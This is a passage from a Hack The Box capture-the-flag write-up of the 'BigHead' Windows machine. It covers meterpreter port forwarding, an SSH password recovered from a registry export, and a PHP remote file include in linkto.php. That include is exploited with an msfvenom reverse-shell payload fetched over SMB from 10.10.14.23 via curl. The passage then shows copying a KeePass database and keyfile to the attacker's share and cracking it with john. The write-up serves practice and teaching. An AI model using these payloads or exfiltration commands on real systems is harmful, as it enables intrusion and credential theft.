 Update for Microsoft .NET Framework 4.5.2 (KB4098976)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4338417)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4344149)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457019)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457038)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4459945)             1
 VMware Tools                                                      10.1.15.6677369
 XAMPP                                                             5.6.36-0
</code></pre></div></div>

<p>A local service is also listening on port 2020:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\nginx&gt;netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENING
</code></pre></div></div>

<p>To access it remotely we can use the <code class="language-plaintext highlighter-rouge">portfwd</code> command within meterpreter:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; portfwd add -l 2020 -p 2020 -r 127.0.0.1
[*] Local TCP relay created: :2020 &lt;-&gt; 127.0.0.1:2020
</code></pre></div></div>

<p>It’s some kind of SSH server: <code class="language-plaintext highlighter-rouge">Bitvise SSH Server (WinSSHD)</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -nv 127.0.0.1 2020
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:2020.
SSH-2.0-7.44 FlowSsh: Bitvise SSH Server (WinSSHD) 7.44: free only for personal non-commercial use
</code></pre></div></div>

<p>I don’t have the credentials so I looked for a while in the registry and eventually found a needle in the haystack.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; search -f *nginx*
Found 14 results...
    c:\nginx\nginx.exe (3115008 bytes)
    c:\nginx\conf\nginx-orig.conf (2773 bytes)
    c:\nginx\conf\nginx.conf (6608 bytes)
    c:\nginx\conf\nginx.conf_bkp (4525 bytes)
    c:\nginx\contrib\geo2nginx.pl (1272 bytes)
    c:\nginx\contrib\unicode2nginx\unicode-to-nginx.pl (1090 bytes)
    c:\nginx\contrib\vim\ftdetect\nginx.vim (198 bytes)
    c:\nginx\contrib\vim\ftplugin\nginx.vim (29 bytes)
    c:\nginx\contrib\vim\indent\nginx.vim (250 bytes)
    c:\nginx\contrib\vim\syntax\nginx.vim (125645 bytes)
    c:\nginx\logs\nginx.pid (6 bytes)
    c:\ProgramData\Microsoft\User Account Pictures\nginx.dat
    c:\Users\All Users\Microsoft\User Account Pictures\nginx.dat
    c:\Windows\System32\nginx.reg (4268 bytes)
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">nginx.reg</code> stands out:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\users\nelson&gt;type c:\Windows\System32\nginx.reg
type c:\Windows\System32\nginx.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"=hex(2):43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,\
  20,00,46,00,69,00,6c,00,65,00,73,00,5c,00,6e,00,73,00,73,00,6d,00,5c,00,77,\
  00,69,00,6e,00,33,00,32,00,5c,00,6e,00,73,00,73,00,6d,00,2e,00,65,00,78,00,\
  65,00,00,00
"DisplayName"="Nginx"
"ObjectName"=".\\nginx"
"Description"="Nginx web server and proxy."
"DelayedAutostart"=dword:00000000
"FailureActionsOnNonCrashFailures"=dword:00000001
"FailureActions"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\
  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00
"Authenticate"=hex:48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00
"PasswordHash"="336d72676e6333205361797a205472794861726465722e2e2e203b440a"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters]
"Application"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6e,\
  00,67,00,69,00,6e,00,78,00,2e,00,65,00,78,00,65,00,00,00
"AppParameters"=hex(2):00,00
"AppDirectory"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,00,00
"AppStdin"=hex(2):73,00,74,00,61,00,72,00,74,00,20,00,6e,00,67,00,69,00,6e,00,\
  78,00,00,00
"AppStdout"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\
  6f,00,67,00,73,00,5c,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,2e,00,6f,\
  00,75,00,74,00,2e,00,6c,00,6f,00,67,00,00,00
"AppStderr"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\
  6f,00,67,00,73,00,5c,00,65,00,72,00,72,00,6f,00,72,00,2e,00,6c,00,6f,00,67,\
  00,00,00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Parameters\AppExit]
@="Restart"

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nginx\Enum]
"0"="Root\\LEGACY_NGINX\\0000"
"Count"=dword:00000001
"NextInstance"=dword:00000001
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">Authenticate</code> key contains: <code class="language-plaintext highlighter-rouge">48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00</code></p>

<p>I like using Cyberchef to decode and convert data, it’s much faster to try different filters/conversion than coding it in python.</p>

<p><img src="/assets/images/htb-writeup-bighead/ssh_password.png" alt="" /></p>

<p>Password: <code class="language-plaintext highlighter-rouge">H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87</code></p>

<p>I can now SSH in with user <code class="language-plaintext highlighter-rouge">nginx</code> but I’m stuck in some sort of limited shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh -p 2020 nginx@127.0.0.1
nginx@127.0.0.1's password: --&gt; `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`

bvshell:/$ whoami
whoami: Command not found.

bvshell:/$ pwd
/

bvshell:/$ ls
anonymous             apache                apache_start.bat      apache_stop.bat       apps                  catalina_service.bat  catalina_start.bat    catalina_stop.bat     cgi-bin
contrib               ctlscript.bat         FileZillaFTP          filezilla_setup.bat   filezilla_start.bat   filezilla_stop.bat    htdocs                img                   install
licenses              locale                mailoutput            mailtodisk            MercuryMail           mercury_start.bat     mercury_stop.bat      mysql                 mysql_start.bat
mysql_stop.bat        nginx.exe             passwords.txt         perl                  php                   phpMyAdmin            properties.ini        readme_de.txt         readme_en.txt
RELEASENOTES          sendmail              service.exe           setup_xampp.bat       src                   test_php.bat          tmp                   tomcat                uninstall.dat
uninstall.exe         user.txt              webalizer             webdav                xampp-control.exe     xampp-control.ini     xampp-control.log     xampp_shell.bat       xampp_start.exe
xampp_stop.exe
</code></pre></div></div>

<p>I checked out the Bitvise website for information on <code class="language-plaintext highlighter-rouge">bvshell</code> and saw that it’s some kind of chroot jail:</p>

<p><img src="/assets/images/htb-writeup-bighead/bvshell.png" alt="" /></p>

<p>That would explain why the above directory listing of the root directory shows the content of xampp and not the root of the Windows server.</p>

<p>There’s a <code class="language-plaintext highlighter-rouge">user.txt</code> file in the directory but I can’t seem to read it.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvshell:/$ cat user.txt
-bvshell: Reading binary file as a text.
</code></pre></div></div>

<h3 id="local-file-include">Local File Include</h3>

<p>The Testlink application is located in <code class="language-plaintext highlighter-rouge">/apps/testlink/htdocs</code>.</p>

<p>The <code class="language-plaintext highlighter-rouge">linkto.php</code> file contains an LFI, the important code is shown below:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// alpha 0.0.1 implementation of our new pipercoin authentication tech</span>
<span class="c1">// full API not done yet. just submit tokens with requests for now.</span>
<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperID'</span><span class="p">])){</span><span class="nv">$PiperCoinAuth</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'PiperCoinID'</span><span class="p">];</span> <span class="c1">//plugins/ppiper/pipercoin.php</span>
        <span class="nv">$PiperCoinSess</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$PiperCoinAuth</span><span class="p">);</span>
				<span class="nv">$PiperCoinAvitar</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="nv">$PiperCoinSess</span><span class="p">;}</span>
<span class="p">[</span><span class="mf">...</span><span class="p">]</span>  
<span class="k">require_once</span><span class="p">(</span><span class="nv">$PiperCoinAuth</span><span class="p">);</span> 
</code></pre></div></div>

<p>When I do a GET request on linkto.php, I get the following error message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">linkto.php</code> has a <code class="language-plaintext highlighter-rouge">require_once($PiperCoinAuth)</code> command, and because <code class="language-plaintext highlighter-rouge">$PiperCoinAuth</code> is under direct control of users through the POST PiperCoinID parameter, we can include any arbitrary PHP file.</p>

<p>I generated a PHP meterpreter payload.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1112 bytes
Saved as: met.php
</code></pre></div></div>

<p>Then sent a POST request to execute PHP code through my SMB server</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># curl -XPOST --data "PiperID=1&amp;PiperCoinID=\\\\10.10.14.23\share\met.php" http://code.bighead.htb/testlink/linkto.php
</code></pre></div></div>

<p>Finally, I get a proper shell as SYSTEM on the target system</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(multi/handler) &gt; [*] Encoded stage with php/base64
[*] Sending encoded stage (51106 bytes) to 10.10.10.112
[*] Meterpreter session 4 opened (10.10.14.23:4444 -&gt; 10.10.10.112:49159) at 2019-05-02 21:06:18 -0400

msf5 exploit(multi/handler) &gt; sessions 4
[*] Starting interaction with 4...

meterpreter &gt; getuid
Server username: SYSTEM (0)
</code></pre></div></div>
<p>Got user flag:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cat /users/nginx/desktop/user.txt
5f158a...
</code></pre></div></div>

<h3 id="getting-roottxt-from-keepass">Getting root.txt from Keepass</h3>

<p>The <code class="language-plaintext highlighter-rouge">root.txt</code> is yet another troll:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; cat /users/administrator/desktop/root.txt

                    * * *

              Gilfoyle's Prayer
     
___________________6666666___________________ 
____________66666__________66666_____________ 
_________6666___________________666__________ 
_______666__6____________________6_666_______ 
_____666_____66_______________666____66______ 
____66_______66666_________66666______666____ 
___66_________6___66_____66___66_______666___ 
__66__________66____6666_____66_________666__ 
_666___________66__666_66___66___________66__ 
_66____________6666_______6666___________666_ 
_66___________6666_________6666__________666_ 
_66________666_________________666_______666_ 
_66_____666______66_______66______666____666_ 
_666__666666666666666666666666666666666__66__ 
__66_______________6____66______________666__ 
___66______________66___66_____________666___ 
____66______________6__66_____________666____ 
_______666___________666___________666_______ 
_________6666_________6_________666__________ 
____________66666_____6____66666_____________ 
___________________6666666________________

   Prayer for The Praise of Satan's Kingdom

              Praise, Hail Satan!
   Glory be to Satan the Father of the Earth
       and to Lucifer our guiding light
    and to Belial who walks between worlds
     and to Lilith the queen of the night
    As it was in the void of the beginning
                   Is now, 
and ever shall be, Satan's kingdom without End

                so it is done.

                    * * *
</code></pre></div></div>

<p>When I started a shell my PHP meterpreter kept dropping so I used the <code class="language-plaintext highlighter-rouge">multi/manage/upload_exec</code> metasploit module to upload an .exe meterpreter and get another meterpreter session. This time I could spawn a shell without losing access.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 post(multi/manage/upload_exec) &gt; run

[*] Uploading /root/htb/bighead/met.exe to met.exe
[*] Executing command: met.exe
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (179808 bytes) to 10.10.10.112

[*] Meterpreter session 7 opened (10.10.14.23:5555 -&gt; 10.10.10.112:49167) at 2019-05-02 21:19:51 -0400

meterpreter &gt; shell
Process 3316 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\xampp\apps\testlink\htdocs&gt;whoami
whoami
nt authority\system
</code></pre></div></div>

<p>The administrator’s <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\AppData\Roaming\KeePass</code> directory contains a Keepass configuration file: <code class="language-plaintext highlighter-rouge">keepass.config.xml</code>. It contains the name of the last keyfile used : <code class="language-plaintext highlighter-rouge">admin.png</code> and the database file: <code class="language-plaintext highlighter-rouge">root.txt</code>. Notice that the file name is <code class="language-plaintext highlighter-rouge">root.txt:Zone.Identifier</code> and not just <code class="language-plaintext highlighter-rouge">root.txt</code> so this means we are looking at NTFS alternate data streams here.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
&lt;Association&gt;
&lt;DatabasePath&gt;..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt;/DatabasePath&gt;
&lt;Password&gt;true&lt;/Password&gt;
&lt;KeyFilePath&gt;..\..\Users\Administrator\Pictures\admin.png&lt;/KeyFilePath&gt;
&lt;/Association&gt;
[...]
</code></pre></div></div>

<p>We can check this by doing <code class="language-plaintext highlighter-rouge">dir /r</code> in the Desktop folder and we can see:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;dir /ah
dir /ah
 Volume in drive C has no label.
 Volume Serial Number is 7882-4E78

 Directory of C:\Users\Administrator\Desktop

06/10/2018  14:33             1,519 root.txt
               1 File(s)          1,519 bytes
               0 Dir(s)  16,316,542,976 bytes free

C:\Users\Administrator\Desktop&gt;dir /r /ah
dir /r /ah
 Volume in drive C has no label.
 Volume Serial Number is 7882-4E78

 Directory of C:\Users\Administrator\Desktop

06/10/2018  14:33             1,519 root.txt
                              7,294 root.txt:Zone.Identifier:$DATA
               1 File(s)          1,519 bytes
               0 Dir(s)  16,316,542,976 bytes free

</code></pre></div></div>

<p>Because the box only has powershell version 2, I can’t use the <code class="language-plaintext highlighter-rouge">-stream</code> flag to extract the ADS. But I found by pure luck that copying the file over SMB will automatically extract the data stream and create two files on my VM:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;attrib -h root.txt

C:\Users\Administrator\Desktop&gt;copy root.txt \\10.10.14.23\share
        1 file(s) copied.

[...]

-rwxr-xr-x  1 root root   1519 Dec 31  1969 root.txt
-rwxr-xr-x  1 root root   7294 Oct  6 10:33 root.txt:Zone.Identifier
</code></pre></div></div>

<p>I also copied the keyfile <code class="language-plaintext highlighter-rouge">admin.png</code>, then renamed <code class="language-plaintext highlighter-rouge">root.txt:Zone.Identifier</code> file to a .kdbx extension:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Administrator\Desktop&gt;copy ..\pictures\admin.png \\10.10.14.23\share
copy ..\pictures\admin.png \\10.10.14.23\share
        1 file(s) copied.
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># file root.kdbx 
root.kdbx: Keepass password database 2.x KDBX
</code></pre></div></div>

<p>When I tried to use keepass2john it didn’t work and just aborted without extracting the hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># keepass2john -k admin.png root.kdbx
admin.png
Aborted
</code></pre></div></div>

<p>Keepass uses the sha256 hash of the keyfile mixed with the password to produce the hash. In this case though the keyfile results in a hash that starts with a null byte so that seems to create a problem with keepass2john:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># sha256sum admin.png 
0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39  admin.png
</code></pre></div></div>

<p>The fix was to just upgrade John to the latest version and I was able to get the hash after:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># keepass2john -k admin.png root.kdbx 
root:$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39
</code></pre></div></div>

<p>Then it didn’t take long to crack the password: <code class="language-plaintext highlighter-rouge">darkness</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Cost 1 (iteration count) is 1 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
darkness         (root)
1g 0:00:00:00 DONE (2019-05-02 21:35) 100.0g/s 73600p/s 73600c/s 73600C/s dreamer..raquel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<p>I used <code class="language-plaintext highlighter-rouge">kpcli</code> to open the KeePass database and found the <code class="language-plaintext highlighter-rouge">root.txt</code> hash inside.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># kpcli --key admin.png --kdb root.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help &lt;command&gt;' for details on individual commands.

kpcli:/&gt; ls
=== Groups ===
chest/
kpcli:/&gt; ls chest
=== Groups ===
hash/
kpcli:/&gt; ls chest/hash
=== Entries ===
1. root.txt

kpcli:/&gt; show -f 0

Title: root.txt
Uname: Gilfoyle
 Pass: 436b83...
  URL: 
Notes: HTB FTW!
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#asm" class="page__taxonomy-item" rel="tag">asm</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#egghunter" class="page__taxonomy-item" rel="tag">egghunter</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">enumeration</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#exploit-development" class="page__taxonomy-item" rel="tag">exploit development</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#insane" class="page__taxonomy-item" rel="tag">insane</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#keepass" class="page__taxonomy-item" rel="tag">keepass</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lfi" class="page__taxonomy-item" rel="tag">lfi</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#nginx" class="page__taxonomy-item" rel="tag">nginx</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ntfs-ads" class="page__taxonomy-item" rel="tag">ntfs ads</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-05-04T00:00:00+02:00">May 04, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-irked/" class="pagination--pager" title="Irked - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-lightweight/" class="pagination--pager" title="Lightweight - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
